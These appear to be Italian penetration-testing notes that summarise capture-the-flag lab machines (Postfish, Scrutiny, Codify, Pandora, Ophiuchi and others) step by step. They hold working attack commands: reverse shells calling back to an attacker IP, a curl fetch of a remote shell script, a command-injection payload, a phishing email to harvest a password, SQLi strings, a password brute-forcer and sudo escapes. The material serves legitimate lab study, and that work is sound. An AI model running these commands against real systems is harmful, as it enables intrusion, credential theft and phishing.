| **POP3**                  | 1. `telnet IP_TARGET 110`<br>2. `USER sales`<br>3. `PASS sales`<br>4. `LIST`<br>5. `RETR 1`                                                                                                                                                                          | Effettuiamo l'accesso a *POP3* e leggiamo che il reparto sales si aspetta una mail di reset password in questi giorni                                                                                                                                                                                                                                                                                                   |
| **Phishing**              | 1. `telnet IP_TARGET 25`<br>2. `HELO  postfish.off`<br>3. `MAIL FROM: it@postfish.off`<br>4. `RCPT TO: brian.moore@postfish.off`<br>5. `DATA`<br>6. `Subject: Reset password`<br>7. `Thisis the link <http://IP_KALI/>`<br>8. `.` <br>9. `nc -lvnp 80`<br>10. `QUIT` | Inviamo una mail a `brian.moore@postfish.off` che abbiamo trovato sul sito ed √® risultato anche nella User Enumeration; inoltre, fa parte del reparto sales che aspetta la mail di reset password. Con la *2.* presentiamo il nostro dominio e con le restanti invieremo la mail come `it@postfish.off`<br><br>Con la *9.* apriamo la porta 80 per ricevere il suo click e la password di `brian.moore:EternalSunshinE` |
| **SSH**                   | 1. `ssh brian.moore@IP_TARGET`                                                                                                                                                                                                                                       | Con le nuove credenziali entriamo in SSH                                                                                                                                                                                                                                                                                                                                                                                |
| **Group**                 | 1. `/bin/bash -i >& /dev/tcp/IP_KALI/25 0>&1`<br>2. `nc -lvnp 25`<br>3. `telnet IP_TARGET 25`<br>4. `HELO postfish.off`<br>5. `MAIL FROM: it@postfish.off`<br>6. `RCPT TO: brian.moore@postfish.off`<br>7. `DATA`<br>8. `Hi there`<br>9. `.`<br>10. `QUIT`           | `brian.moore` fa parte del gruppo `filter` che dalla scansione con linpeas pare avere controllo sul file `/etc/postfix/disclamer` che viene eseguito dal root se viene inviata una mail da `it@postfish.off`. Dunque modifichiamo il file inserendo con la *1.* una reverse shell, con la *2.* apriamo la porta e con le restanti inviamo la mail per attivare lo script.<br><br>Diventiamo utenti `filter`             |
| **SUDO**                  | 1. `sudo /usr/bin/mail --exec='!/bin/sh'`                                                                                                                                                                                                                            | L'utente `filter` ha permessi SUDO sul comando `mail *` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/mail/#sudo) √® vulnerabile. Ora siamo root                                                                                                                                                                                                                                                            |

## Authentication Bypass

### Silver Platter

| üß† **Azione**                        | üíª **Comando / Metodo**                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                            |
| ------------------------------------ | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Silverpeas**                       |                                         | Nella sezione *contact* troviamo un riferimento ad un utente di nome `scriptkiddie` ed un servizio di nome *Silverpeas*.<br>Sulla porta `8080/silverpeas` troviamo la pagina di login                                                                                                                                                            |
| **Silverpeas Authentication Bypass** |                                         | Secondo questa [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d) il servizio √® vulnerabile a *Authentication Bypass*. Ci basta intercettare la richiesta di login con un utente esistente ed eliminare il campo della password. Inoltrare tutte le richieste che vengono dopo finch√© non si ha l'accesso |
| **Credentials**                      |                                         | Nella sezione delle notifiche `/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6` notiamo che il parametro *ID* √® vulnerabile ad IDOR, inserendo vari numeri leggiamo le altre notifiche e troviamo le credenziali per SSH                                                                                                                        |
| **Logs**                             | 1. `cat /var/log/auth* \| grep -i pass` | Nella cartella `/var/log` applichiamo il comando *1.* per trovare tutti i cambi di password ed altre notifiche legate all'autenticazione. Troviamo le credenziali dell'utente `tyler`                                                                                                                                                            |
| **SUDO**                             | 1. `sudo su`                            | L'utente `tyler` ha i massimi privilegi SUDO dunque pu√≤ diventare root con la *1.*                                                                                                                                                                                                                                                               |

- [writeup](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Silver-Platter/readme.md)

### Fired

| üß† **Azione**      | üíª **Comando / Metodo**                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------------ | ------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OpenFire 4.7.3** | 1. `python3 CVE-2023-32315.py -t http://IP_TARGET:9090` | Sulla porta `9090` notiamo che gira il servizio *OpenFire 4.7.3* che √® vulnerabile a [Authentication Bypass](https://github.com/miko550/CVE-2023-32315). <br>Dopo aver clonato il git utilizziamo la *1.* per creare un utente amministratore sulla web application. Seguendo la guida del link procediamo con:<br>1. caricare il file `openfire-management-tool-plugin.jar` sulla sezione Plugin.<br>2. Andare su Sever => Server settings > Management tool<br>3. Accedere alla webshell con password `123`<br>4. Avviare una reverse shell |
| **Root**           |                                                         | Siamo entrati gi√† come root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |

- [writeup](https://medium.com/@basha5969/fired-proving-grounds-aad10f26d180)


### Scrutiny

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TeamCity**          | 1. `python3 RCity.py -t http://teams.randsonly.com -no-enum -c id`                                                                                                                                                                                                                                                                                                                                                                                                               | Durante l'enumerazione troviamo il servizio *TeamCity* che √® vulnerabile a [RCE](https://github.com/Stuub/RCity-CVE-2024-27198?source=post_page-----01737dd96583---------------------------------------).<br>Lo avviamo con la *1.* per creare l'utente ed avviare una RCE.                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **DEBUG MODE**        | 1. `curl -X POST http://teams.onlyrands.com/app/rest/users/id:IDCREATEDUSER/tokens/RPC2 -u USER:PASS`<br>2. `export TERM=TOKEN`<br>3. `curl -X POST 'http://DOMAIN_TARGET/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"`<br>4.  `curl 'http://DOMAIN_TARGET/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN"` | Notiamo che l'utente viene creato ma la RCE non va! Googlando l'errore che ci appare `Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via ‚Äúrest.debug.processes.enable‚Äù internal property` troviamo questa [guida](https://0xdf.gitlab.io/2024/08/24/htb-runner.html#via-admin-panel) che ci dice che dobbiamo prima attivare la DEBUG MODE.<br>Utilizziamo la *1.* per ottenere il TOKEN dell'utente creato e poi la *3.* e *4.* per avviare il DEBUG MODE.<br><br>NB: la [guida](https://0xdf.gitlab.io/2024/08/24/htb-runner.html#via-admin-panel) menzionata prima mostra altri modi interessanti per exploitare |
| **Ritentiamo la RCE** | 1. `python3 RCity.py -t http://teams.randsonly.com -no-enum -c id`<br>2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI LPORT >/tmp/f`                                                                                                                                                                                                                                                                                                                              | Ritentando il comando della prima sezione adesso la RCE funziona.<br>Usiamo la *2.* per avviare una reverse shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **SSH**               | 1. `ssh2john id_rsa > hash`<br>2. `john hash --wordlist=/usr/share/wordlists/rockyou.txt`                                                                                                                                                                                                                                                                                                                                                                                        | Dentro il pannello admin sulla web application `http://teams.onlyrands.com/buildConfiguration/Freelancers_MarcoTillman_Build#all-projects` troviamo che tra le operazioni effettuate √® presente la chiave SSH di marcot.<br><br>Usiamo la *1.* e *2.* per trovare il passphrase                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Mails**             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Come utenti marcot nella cartella `/var/mails` troviamo le emails dei dipendenti e scopriamo delle credenziali per l'utente matthewa                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| **Credentials**       |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Dentro la cartella di matthes troviamo il file `.~` sono presenti le credenziali dell'utente briand                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **SUDO**              | 1. `sudo /usr/bin/systemctl status teamcity-server.service`<br>2. `!sh`                                                                                                                                                                                                                                                                                                                                                                                                          | Notiamo che tra i permessi SUDO possiamo fare `(root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service` quindi seguendo la guida [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#sudo) applichiamo la *1.* e la *2.*                                                                                                                                                                                                                                                                                                                                                                                                                                                               |

- [writeup](https://medium.com/@adamforsythebartlett/scrutiny-walkthrough-proving-grounds-practice-01737dd96583)

### SpiderSociety

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                   |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CMS**       |                                                                                                                                                                  | Durante l'enumerazione troviamo il path `/libspider` e troviamo un servizio che √® accessibile con le credenziali di default `admin:admin`. Al suo interno troviamo le credenziali per il servizio FTP                                                                                                                   |
| **FTP**       |                                                                                                                                                                  | Scaricando il contenuto di FTP troviamo nella cartella `libspider` un riferimento ad un path che navigandolo troviamo le credenziali per SSH                                                                                                                                                                            |
| **SUDO**      | 1. ![[1_LZVCicBtqBuo_PDzGzLZDg.webp]]<br>2. `nc -lvnp LPORT` <br>3. `sudo /bin/systemctl daemon-reload`<br>4. `sudo /bin/systemctl restart spiderbackup.service` | L'utente attuale ha i seguenti permessi SUDO:<br>`(ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service`<br>`(ALL) NOPASSWD: /bin/systemctl daemon-reload`<br>Cerchiamo il file `spiderbackup.service` ed usiamo la *1.* per inserire una reverse shell. Adesso utilizziamo *3.* e *4.* per riavviare il servizio |


- [writeup](https://medium.com/@hxlxmj/%EF%B8%8F-spidersociety-a-full-walkthrough-395ed6cd13f4)

### Potato

| üß† **Azione**        | üíª **Comando / Metodo**                | üìù **Output / Scopo**                                                                                                                                                                                                                                                           |
| -------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **strcompare() PHP** |                                        | Durante l'enumerazione trovo una pagina di login, intercettando la richiesta e cambiando il parametro `password=` in `password[]=` come *1.*                                                                                                                                    |
| **LFI**              | 1. `john hash --wordlist=rockyou.txt`  | Intercettando la richiesta per il recupero dei file logs, notiamo il parametro `file=` che √® vulnerabile a LFI. Con `file=../../../../../etc/passwd` e troviamo l'utente webadmin e la password associata che craccandola con la *1.* la otteniamo in chiaro                    |
| **Wildecard SUDO**   | 1. `sudo /bin/nice /notes/../bin/bash` | Controllando i file SUDO notiamo `(ALL : ALL) /bin/nice /notes/*` che secondo [GTFObins](https://medium.com/@aniketdas07770/offsecprovinggrounds-potato-writeup-da6a2693b6fa) √® vulnerabile.¬ß<br>Utilizziamo la *1.* per bypassare la *wildecard* e sfruttare un path traversal |

- [writeup](https://medium.com/@aniketdas07770/offsecprovinggrounds-potato-writeup-da6a2693b6fa)

### CozyHosting

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                 |
| --------------------- | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Spring**            |                                                                                                             | Notiamo che il servizio esposto sulla porta `80` √® stato fatto con *Spring*, dunque per il fuzzing directories utilizziamo la wordlist apposita presente [qui](https://github.com/danielmiessler/SecLists/blob/13f47b53f91c2500603d50623a961a1bd388efa5/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt#L4). |
| **Session ID**        | 1. ![[Pasted image 20250813182038.png]]                                                                     | Dal fuzzing directories troviamo `/actuator/sessions` in cui √® presente il cookie dell'utente `kanderson`. Sostituendolo come nella *1.* e riavviando la pagina otteniamo l'accesso                                                                                                                                                   |
| **Command Injection** | 1. ```host=10.129.7.4&username=a;`(sh)0>/dev/tcp/IP_KALI/443```                                             | Una volta dentro notiamo che alcuni parametri sono vulnerabili a *Command Injection*, dunque utilizziamo la *1.* per avviare una reverse shell                                                                                                                                                                                        |
| **Postgres**          | 1. `psql -U postgres -h 127.0.0.1`<br>2. `hashcat hash -m 3200 --wordlist /usr/share/wordlists/rockyou.txt` | Dalle cartelle presenti notiamo che c'√® il servizio *Postgres* quindi utilizziamo la *1.* con le credenziali di default `postgres:postgres` per entrare nel database. Troviamo la password hashata dell'utente `josh` ed utilizziamo la *2.* per craccarla                                                                            |
| **SUDO**              | 1. `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`                                                             | Controllando i privilegi SUDO notiamo che presente `ssh` che √® vulnerabile secondo [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo). Utilizziamo la *1.* per diventare root                                                                                                                                                  |

- [writeup](https://publish.obsidian.md/cn-0x-writeups/Hack+The+Box/CozyHosting/Cozyhosting)


## Sandbox Escape

### Codify

| üß† **Azione**    | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                              |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **vm2 3.9.16**   | 1. ![[Pasted image 20250813203641.png]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Sulla porta `80` troviamo un riferimento a *vm2 3.9.16* che √® vulnerabile secondo [CVE-2023-29017](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c). Avviamo una reverse shell come nella *1.* per exploitare la vulnerabilit√†                                                                                                                                  |
| **Cracking**     | 1. `hashcat -m 3200 hash rockyou.txt --force --show`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Troviamo il file `/var/www/contact/tickets.db` dove √® presente la password hashata dell'utente `joshua`. Utilizziamo la *1.* per decriptarla ed entrare con SSH                                                                                                                                                                                                                    |
| **Script Abuse** | 1. ```python<br>import subprocess<br>import string<br>import sys<br>import time<br>def check_password(guess):<br>    try:<br>        process = subprocess.Popen(['sudo', '-S', '/opt/scripts/mysql-backup.sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)<br>        stdout, stderr = process.communicate(input=guess)<br>        process.wait()<br>    except subprocess.SubprocessError as e:<br>        print(f"An error occurred: {e}")<br>        return False<br>    return "Password confirmed!" in stdout<br><br><br>characters = string.ascii_letters + string.digits<br><br>password_guess = ""<br><br><br>max_password_length = 25<br><br>for _ in range(max_password_length):<br>    found = False<br>    for char in characters:<br>        # Append the current character and a wildcard to the guess<br>        temp_guess = password_guess + char + "*\n"  # Adding newline to simulate pressing Enter<br>        # Print the current password guess, overwriting the same line<br>        print(f"\rCurrent guess: {password_guess + char}", end='', flush=True)<br>        time.sleep(0.1)  # Added sleep to slow down the output for demonstration purposes<br>        if check_password(temp_guess):<br>            # If the guess is correct, update the password_guess and move to the next character<br>            password_guess += char<br>            print(f"\rCurrent guess: {password_guess} ", end='', flush=True)  # Ensure the line is updated with the latest guess<br>            found = True<br>            break<br>    if not found:<br>        # If no character was found, assume the end of the password has been reached<br>        print(f"\nPassword found: {password_guess}")<br>        break<br>``` | L'utente ha i permessi SUDO per un file che conferma la password dell'utente root se questa √® inserita. Poich√© il codice utilizza variabile non racchiuse tra virgolette `[[$variable1 == $variable2 ]]` allora √® possibile un carattere ed la wildecard per indovinare carattere per carattere (come nel blind sqli). Automatizziamo il tutto scrivendo un codice come nella *1.* |

- [writeup](https://projectblack.io/blog/hack-the-box-codify/)


## SNMP

### Pandora

| üß† **Azione**                       | üíª **Comando / Metodo**                                                                                                   | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SNMP**                            | 1. `python3 snmpbrute.py -t IP_TARGET`<br>2. `snmpwalk -vc2 -c public IP_TARGET`                                          | Con una semplice scansione scopriamo che la porta `161` √® aperta, dunque utilizziamo la *1.* per vedere quali sezioni sono aperte e la *2.* per enumerarle. Scopriamo le credenziali `daniel:HotelBabylon23`                                                                                                                                                                                                                                                           |
| **80 Port**                         | 1. ![[Pasted image 20250816162818.png]]<br>2. ![[Pasted image 20250816162825.png]]                                        | Dalla cartella `/var/www` notiamo che ci sono due cartelle `/html` e `/pandora` e questo ci fa sospettare che sulla porta `80` appaiano due servizi diversi a seconda se si entra dall'esterno o dall'interno. Per sciogliere ogni dubbio controlliamo il file `/etc/apache2/sites-enabled/000-default.conf` *1.* ed il file `/etc/apache2/sites-enabled/pandora.conf` *2.* e notiamo che entrambi girano sulla porta `80` ma l'ultimo √® accessibile solo dall'interno |
| **Port Forwarding**                 | 1. *KALI:* `./chisel server --port 9002 --reverse`<br>2. *TARGET:* `./chisel client IP_KALI:9002 R:8081:127.0.0.1:80`<br> | Per accedere al servizio dall'interno forwardiamo la porta sulla nostra macchina con la *1.* e *2.* e navighiamolo                                                                                                                                                                                                                                                                                                                                                     |
| **Pandora v7.0NG.742_FIX_PERL2020** | 1. `python3 sqlpwn.py -t IP_TARGET:8081`                                                                                  | Entrando dall'interno troviamo il servizio *Pandora v7.0NG.742_FIX_PERL2020* che scopriamo essere vulnerabile [CVE-# 2021-32099](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated). Utilizziamo la *1.* per sfruttare la RCE                                                                                                                                                                                                                   |
| **SSH Access**                      | 1. `ssh-keygen -t rsa -b 4096 -f id_rsa`<br>2. `echo "PUBLIC KEY" > /home/matt/.ssh/authorized_keys`                      | Generiamo con la *1.* una chiave SSH ed inseriamo la pubblica con la *2.* nel file `/home/matt/.ssh/authorized_keys`<br><br>NB: poich√© l'RCE funziona tramite web √® necessario codificare i caratteri speciali della chiave in URL                                                                                                                                                                                                                                     |
| **SUID && PATH Injection**          | 1. `export PATH=/tmp/matt:$PATH`<br>2. `echo "/bin/bash" > tar`<br>3. `chmod +x tar`<br>4. `/usr/bin/backup.sh`           | L'utente attuale pu√≤ avviare uno script di nome `backup.sh` che √® vulnerabile a *PATH Injection* tramite il modulo `tar` (senza path assoluto).<br>Inseriamo il nostro PATH dove verr√† cercato il modulo `tar` nella variabile d'ambiente tramite la *1.* e poi creiamo un file eseguibile con la *2.* e *3.*. Con la *4.* richiamiamo lo script per diventare root                                                                                                    |



- [writeup](https://olivierkonate.medium.com/hackthebox-pandora-c28e92f900d6)

### Underpass
| üß† **Azione**  | üíª **Comando / Metodo**                                  | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                  |
| -------------- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SNMP**       | 1. `snmpwalk -v2c -c public IP_TARGET`                   | Enumerando le porte UDP troviamo la `161` aperta, utilizziamo la *1.* da cui scopriamo che sulla macchina √® attiva il servizio *DaloRADIUS*                                                                                                                                                                                            |
| **DaloRAIDUS** |                                                          | Effettuando un fuzzing directories scopriamo il percorso `/operators/login.php` dove √® presente un pannello di login. Si pu√≤ effettuare l'accesso utilizzando le credenziali di default `administrator:radius`.<br>Sulla DASHBOARD > USERS troviamo una password cifrata che cracchiamo con [Crackstation](https://crackstation.net/). |
| **SUDO**       | 1. `mosh --server="sudo /usr/bin/mosh-server" localhost` | Utilizziamo le credenziali trovate nel passo precedente per effettuare l'accesso in SSH. Tra i file SUDO √® presente `mosh-server` che secondo questo [articolo](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html) √® vulnerabile. Utilizziamo la *1.* per diventare root                                 |


- [writeup](https://medium.com/@NTHSec/underpass-hackthebox-ctf-walkthrough-5c51af4c60b6)

## Others

### Ophiuchi

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **YAML exploitation**  | 1. `Runtime.getRuntime().exec("curl IP_KALI/shell.sh -o /tmp/shell.sh");`<br>2. `javac src/artsploit/AwesomeScriptEngineFactory.java`<br>3. `jar -cvf yaml-payload.jar -C src/ .`<br>4. `!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL ["http://IP_KALI/"]  ]]]` | Navigando sul sito troviamo che utilizza il linguaggio `yaml` che secondo questo [articolo](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) √® vulnerabile con questo [exploit](https://github.com/snakeyaml/snakeyaml). Modificando il codice come nella *1.* richiamiamo una reverse shell. Compiliamo l'exploit con *2.* e *3.* infine inseriamo nel parser sul web la *4.*                                                  |
| **Credentials reused** | `su -u admin`                                                                                                                                                                                                                                                                                           | Nella cartella del web server troviamo il file `conf/tomcat-users.xml` che contiene le credenziali `admin:whythereisalimit`. Utilizzando le stesse credenziali accediamo all'utente `admin`                                                                                                                                                                                                                                                                     |
| **Path hijacking**     | 1. `sudo -l`<br>2. `wasm2wat main.wasm -o main.wat`<br>3. `echo "bash -c 'bash -i >& /dev/tcp/IP_KALI/4444 0>&1'" > file`<br>4. `sudo /usr/bin/go /opt/wasm-functions/index.go`                                                                                                                         | Tra i privilegi SUDO troviamo che possiamo eseguire il file `/usr/bin/go /opt/wasm-functions/index.go`. Notiamo che il file SUDO ha due possibilit√†: se il valore `f=1` allora eseguir√† un file senza path assoluto e quindi potremmo fare *path hijacking*. <br>Ma `f` dipende dal file `main.wasm` che √® in binario quindi dobbiamo prima trasformarlo con la *2.* in testo cos√¨ da cambiarne il valore. Creiamo il file con *3.* ed eseguiamo l'attacco *4.* |


### Pit

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                       |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **UDP Ports**          | 1. `nmap -sU --top-ports 10 -sV IP_TARGET`<br>2. `snmpwalk -v2c -c public IP_TARGET .`                                                                                           | Controllando le porte UDP con la *1.* notiamo che la *161* √® aperta. Enumeriamo la porta UDP aperta con la *2.* e dal suo output escono molte informazioni tra cui le credenziali usate `michelle:michelle` ed il servizio `SeedDMS` sul path `/seeddms51x/seeddms`                                                                                         |
| **SeedDMS 5.1.X**      |                                                                                                                                                                                  | Una volta entrati con le credenziali trovate, notiamo che secondo la [CVE-2019-12744](https://www.exploit-db.com/exploits/47022) √® vulnerabile a *RCE*. Carichiamo il file `.php` come indicato sulla CVE e poi navighiamo il path `txt/data/1048576/ID_DOCUMENT/FILE_NAME.php?cmd=id`                                                                      |
| **Reused Credentials** |                                                                                                                                                                                  | Da dentro la macchina navighiamo sul path `/var/www/html/conf/sttings.xml` dove troviamo le credenziali `michelle:ied^ieY6xoquu`                                                                                                                                                                                                                            |
| **Cockpit**            |                                                                                                                                                                                  | Utilizziamo le credenziali appena trovate per entrare sulla porta `9090` dove √® presente il servizio `CockPit`. All'interno di esso troviamo un terminale avviato come utente `michelle`                                                                                                                                                                    |
| **Monitoring**         | 1. `ssh-keygen -f key`<br>2. `echo "echo 'CONTENUTO_SSH_PUBBLICA' > /root/.ssh/authorized_keys" > /usr/local/monitoring`<br>3. `chmod 600 key`<br>4. `ssh -i key root@IP_TARGET` | L'utente attuale ha i permessi per scrivere sul path `/usr/local/monitoring` dove vediamo che l'utente root esegue comandi UDP secodpo il seguente articolo [SNMP RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/) quindi creiamo con la *1.* una chiave SSH e con la *2.* incolliamola sul path dell'utente root per poi collegarci |

- [writeup](https://0xdf.gitlab.io/2021/09/25/htb-pit.html)

### Poison

| üß† **Azione**               | üíª **Comando / Metodo**                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                     |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PHPInfo from LFI to RCE** | 1. `python2 phpinfolfi.py IP_TARGET 80 100`                                                                                                      | Troviamo la pagina `phpinfo.php` e sappiamo che √® vulnerabile ad [LFI](https://raw.githubusercontent.com/mikaelkall/HackingAllTheThings/refs/heads/master/lfi/phpinfolfi.py) . Scarichiamo lo script e cambiamo il path in POST in *riga 130* in `phpinfo` ed il GET in *riga 142* in `/browse.php?file=` ovvero dove abbiamo identificato la vulnerabilit√† LFI. Abbiamo ottenuto una RCE |
| **Logs**                    | 1. `DOCUMENTARSI`                                                                                                                                | Con LFI possiamo anche vedere il file di log `/var/log/httpd-access.log` che potrebbe essere vulnerabile a [Log Poisoning](https://wpscan.com/vulnerability/78575072-4e04-4a8a-baec-f313cfffe829/)                                                                                                                                                                                        |
| **Credentials in Base64**   | 1. `for i in $(seq 0 12); do echo "\| base64 -d"; done`                                                                                          | Nel file di `/var/conf/apache2/passswbackup.txt` troviamo una password in Base64. Per decifrarla applichiamo 12 volte la decifratura. Finalmente troviamo le credenziali `charix:Charix!2#4%6&8(0`                                                                                                                                                                                        |
| **VNC**                     | 1. `ssh -L5901:127.0.0.1:5901 -oKexAlgorithms=+diffie-hellman-group1-sha1 charix@IP_TARGET`<br>2. `vncviewer -passwd FILE_PASS 127.0.0.1:5901  ` | Guardando tra le porte aperte notiamo che la `5901` e `5801` sono aperte; queste porte sono tipiche del servizio VNC. Se ci colleghiamo al servizio otterremo il terminale come `root`<br>Applichiamo la *1.* per forwardare la porta e la *2.* per connetterci. Siamo finalmente root                                                                                                    |

### Apex

> [!NOTE]
> Abbiamo due modi per svolgere questo exploit

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OpenEMR 5.0.1**      | 1. `python3 cve.py -t TARGET_IP --table users_secure`<br>2. `...updatexml(1, concat(0x7e, substr((select password from users_secure limit 1 offset 0), 1, 1)), 0)` | Navigando sul server troviamo il path `/openemr`.Scopriamo la sua versione da `/admin.php` ed √® *OpenEMR 5.0.1* che √® vulnerabile a [SQLi](https://github.com/M3str3/OpenEMR-exploits/tree/main/sql%20injection/cve-2018-17179) . Infatti con la *1.* riusciamo ad ottenere le password utenti.<br><br>NB: il metodo utilizzato restituisce met√† della password, dunque bisognerebbe catturare la richiesta con Burp e modificare il parametro vulnerabile `enc=` come nella *2.* per ricavarsi lettera per lettera della password |
| **METODO ALTERNATIVO** | 1. `python3 exploit.py http://IP_TARGET PHPSESSID= /etc/passwd`<br>2. `python3 exploit.py http://IP_TARGET PHPSESSID= /var/www/openemr/sites/default/sqlconf.php`  | Un altro modo per exploitare √® quello di aver trovato il percorso `/filemanager` che √® vulnerabile a [Path Traversal](https://github.com/hoanx4/responsive_filemanager). Facciamo il PoC con la *1.* e con la *2.* prendiamo le credenziali del DB. Nota che bisogna cambiare il codice `exploit.py` come indicato nel [writeuo](https://medium.com/@AveragePomelo/proving-ground-practice-walkthrough-apex-linux-0e1e3f227b8e)                                                                                                    |
